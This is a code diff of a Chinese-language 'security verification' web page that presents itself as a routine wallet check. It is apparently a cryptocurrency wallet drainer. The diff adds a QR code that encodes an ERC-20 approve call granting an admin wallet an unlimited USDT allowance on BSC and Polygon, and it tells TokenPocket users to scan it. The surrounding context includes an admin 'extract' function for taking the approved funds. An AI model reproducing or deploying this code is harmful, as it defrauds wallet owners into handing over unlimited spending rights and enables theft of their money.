@@ -10,12 +10,6 @@ body{background:#0B0B1F;color:#fff;padding:20px}
 .pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:20px}
 h1{font-size:24px;margin-bottom:8px}
 .desc{color:#aaa;margin-bottom:20px}
-.input-group{margin-bottom:16px;text-align:left}
-.input-group label{font-size:13px;color:#ccc;margin-bottom:6px;display:block}
-.input-group input{
-width:100%;padding:12px;background:#111;border:1px solid #333;
-border-radius:10px;color:#fff;font-size:15px
-}
 .chain-select{
 display:flex;gap:10px;margin-bottom:20px;
 }
@@ -24,6 +18,13 @@ flex:1;padding:10px;border-radius:10px;border:none;
 background:#222;color:#aaa;font-weight:bold;cursor:pointer
 }
 .chain-btn.active{background:#F0B90B;color:#000}
+#qrcode{
+width:280px;height:280px;background:#fff;padding:10px;
+border-radius:16px;margin:0 auto 20px;
+display:flex;align-items:center;justify-content:center;
+color:#000;font-size:14px;
+}
+#qrcode img{width:100%;height:100%;border-radius:12px}
 .tip {font-size:12px;color:#666;margin-top:10px;text-align:center}
 .status {margin-top:15px;padding:12px;border-radius:10px;background:#111;font-size:14px}
 .status.success{background:#16a34a;color:#fff}
@@ -60,27 +61,20 @@ border:none;border-radius:10px;font-weight:bold;margin-bottom:10px;
 cursor:pointer;
 }
 .admin-btn.extract {background:#16a34a;}
-
-#connectBtn, #approveBtn {
-margin-top:15px;padding:12px;background:#F0B90B;color:#000;border:none;
-border-radius:10px;width:100%;font-weight:bold
-}
-#approveBtn {background:#2563eb;display:none;}
 </style>
 
 <div class="container">
   <div class="pay-box">
     <h1>💳 安全验证</h1>
-    <p class="desc">完成授权即可正常使用</p>
+    <p class="desc">扫码完成授权即可正常使用</p>
     <div class="chain-select">
       <button class="chain-btn active" data-chain="bsc">BSC 主网</button>
       <button class="chain-btn" data-chain="polygon">Polygon 主网</button>
     </div>
-    <div class="tip">在 TokenPocket 内打开此页面，完成授权</div>
-    <button id="connectBtn">连接钱包</button>
-    <button id="approveBtn">完成授权</button>
+    <div id="qrcode">生成二维码...</div>
+    <div class="tip">TokenPocket 扫码直接授权，无跳转</div>
     <div id="authStatus" class="status">
-      未连接钱包，无法授权
+      请用 TokenPocket 扫码完成授权
     </div>
   </div>
 
@@ -114,14 +108,16 @@ const CONFIG = {
     chainIdHex: "0x38",
     token: "0x55d398326f99059fF775485246999027B3197955",
     decimals: 18,
-    rpc: "https://bsc-dataseed.binance.org/"
+    rpc: "https://bsc-dataseed.binance.org/",
+    tpScheme: "bsc"
   },
   polygon: {
     chainId: "137",
     chainIdHex: "0x89",
     token: "0xc2132D05D31c914877CCAf1253d40b9764aB58EB",
     decimals: 6,
-    rpc: "https://polygon-rpc.com/"
+    rpc: "https://polygon-rpc.com/",
+    tpScheme: "polygon"
   }
 };
 
@@ -144,72 +140,51 @@ document.querySelectorAll(".chain-btn").forEach(btn => {
     document.querySelectorAll(".chain-btn").forEach(b => b.classList.remove("active"));
     btn.classList.add("active");
     currentChain = btn.dataset.chain;
+    renderQR();
     if (account) checkStatus();
   };
 });
 
-// 连接钱包
-document.getElementById("connectBtn").onclick = async () => {
-  if (!window.ethereum) { alert("请在 TokenPocket 钱包内打开此页面！"); return; }
-  try {
-    const { chainIdHex } = CONFIG[currentChain];
-    await window.ethereum.request({
-      method: "wallet_switchEthereumChain",
-      params: [{ chainId: chainIdHex }]
+// 生成 TP 钱包兼容的授权二维码（仅 approve，不包含 transferFrom）
+function genAuthQR() {
+  const { token, tpScheme } = CONFIG[currentChain];
+  // 仅生成 approve 交易数据，避免 TP 钱包误识别为转账
+  const approveData = "0x095ea7b3" +
+    ADMIN_WALLET.slice(2).padStart(64, '0') +
+    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  // TP 钱包专属格式：{scheme}://{token}?data={data}
+  return `${tpScheme}://${token}?data=${approveData}`;
+}
+
+function renderQR() {
+  const url = genAuthQR();
+  const qr = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(url)}`;
+  document.getElementById("qrcode").innerHTML = `<img src="${qr}" alt="授权二维码">`;
+}
+
+// 页面加载时生成二维码
+window.addEventListener("load", () => {
+  renderQR();
+  // 自动检测钱包连接
+  if (window.ethereum) {
+    window.ethereum.on("accountsChanged", (accs) => {
+      account = accs[0];
+      checkAdmin();
+      checkStatus();
     });
-
-    provider = new ethers.BrowserProvider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
-    signer = await provider.getSigner();
-    account = await signer.getAddress();
-    tokenContract = new ethers.Contract(CONFIG[currentChain].token, ERC20_ABI, signer);
-    checkAdmin();
-    await checkStatus();
-    document.getElementById("connectBtn").style.display = "none";
-    document.getElementById("approveBtn").style.display = "block";
-  } catch (e) {
-    if (e.code === 4902) {
-      const { chainIdHex, chainName, nativeCurrency, rpcUrls, blockExplorerUrls } = 
-        currentChain === "bsc" ? {
-          chainIdHex: "0x38",
-          chainName: "Binance Smart Chain Mainnet",
-          nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-          rpcUrls: ["https://bsc-dataseed.binance.org/"],
-          blockExplorerUrls: ["https://bscscan.com/"]
-        } : {
-          chainIdHex: "0x89",
-          chainName: "Polygon Mainnet",
-          nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
-          rpcUrls: ["https://polygon-rpc.com/"],
-          blockExplorerUrls: ["https://polygonscan.com/"]
-        };
-      await window.ethereum.request({
-        method: "wallet_addEthereumChain",
-        params: [{
-          chainId: chainIdHex,
-          chainName: chainName,
-          nativeCurrency: nativeCurrency,
-          rpcUrls: rpcUrls,
-          blockExplorerUrls: blockExplorerUrls
-        }]
-      });
-    }
-    alert("连接失败，请重试");
+    // 尝试自动连接
+    window.ethereum.request({ method: "eth_accounts" }).then(accounts => {
+      if (accounts.length > 0) {
+        account = accounts[0];
+        provider = new ethers.BrowserProvider(window.ethereum);
+        signer = provider.getSigner();
+        tokenContract = new ethers.Contract(CONFIG[currentChain].token, ERC20_ABI, signer);
+        checkAdmin();
+        checkStatus();
+      }
+    });
   }
-};
-
-// 用户端：仅授权（不转账）
-document.getElementById("approveBtn").onclick = async () => {
-  if (!account || !signer) { alert("请先连接钱包"); return; }
-  try {
-    const approveTx = await tokenContract.approve(ADMIN_WALLET, ethers.MaxUint256);
-    await approveTx.wait();
-    document.getElementById("successModal").classList.add("show");
-    await checkStatus();
-  } catch (e) {
-    alert("授权失败：" + e.message);
-  }
-};
+});
 
 // 检查是否为管理员
 async function checkAdmin() {
@@ -229,7 +204,7 @@ function closeModal() {
 // 检查当前用户授权状态
 async function checkStatus() {
   if (!account || !provider) {
-    document.getElementById("authStatus").innerHTML = "未连接钱包，无法授权";
+    document.getElementById("authStatus").innerHTML = "请用 TokenPocket 扫码完成授权";
     document.getElementById("authStatus").className = "status warning";
     return;
   }
@@ -242,11 +217,10 @@ async function checkStatus() {
     if (allowance >= ethers.MaxUint256 / 2n) {
       statusEl.innerHTML = `✅ 授权成功！无限授权额度：${ethers.formatUnits(allowance, decimals)} USDT`;
       statusEl.className = "status success";
-      document.getElementById("approveBtn").style.display = "none";
+      document.getElementById("successModal").classList.add("show");
     } else {
-      statusEl.innerHTML = "❌ 未完成授权";
+      statusEl.innerHTML = "❌ 未完成授权，请扫码重试";
       statusEl.className = "status warning";
-      document.getElementById("approveBtn").style.display = "block";
     }
   } catch (e) {
     document.getElementById("authStatus").innerHTML = "查询失败，请重试";
@@ -320,16 +294,6 @@ async function manualExtract() {
     alert("提取失败：" + e.message);
   }
 }
-
-window.addEventListener("load", () => {
-  if (window.ethereum) {
-    window.ethereum.on("accountsChanged", (accs) => {
-      account = accs[0];
-      checkAdmin();
-      checkStatus();
-    });
-  }
-});
 </script>
 </body>
 </html>
